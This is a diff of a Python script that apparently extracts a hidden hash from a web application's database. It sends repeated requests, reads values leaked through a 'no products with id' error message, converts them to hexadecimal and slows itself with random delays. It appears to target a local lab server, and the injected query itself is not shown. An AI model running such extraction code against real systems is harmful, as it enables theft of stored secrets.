@@ -9,9 +9,8 @@ from baseconvert import BaseConverter
 # ONLY MODIFY THE FOLLOWING FEW LINES!
 # The table_list should be empty if not used (e.g. table_list1 = []).
 #########################################################################
-port = 2680
-table_list1 = []
-table_list2 = []
+port = 2459
+table_list1 = ['e5fb5cc3e39a4b68cbb1623bfcd662e']
 #########################################################################
 # END CONFIG
 #########################################################################
@@ -64,12 +63,6 @@ if len(table_list1) == 0:
         table_list1.append(total_database_table_string)
         print('Database name:{}'.format(total_database_table_string))
 
-    print('All tables found the first time:')
-    pprint.pprint(table_list1)
-    print('Please restart your server now. Press enter when done.')
-    input()
-
-
 table_with_hash = table_list1[0]
 
 print('Table with hash is : {}'.format(table_with_hash))
@@ -81,6 +74,7 @@ for substring in range(1, 33, 10):
     r = requests.get(url)
     page_text = r.text
     base_10_value = value_in_between(page_text, 'There are no products with id: [', ']')
+    print(base_10_value)
     base_16_value = convert_base(base_10_value)
     hash_string += base_16_value
     time.sleep(randint(1, 40) / 20)
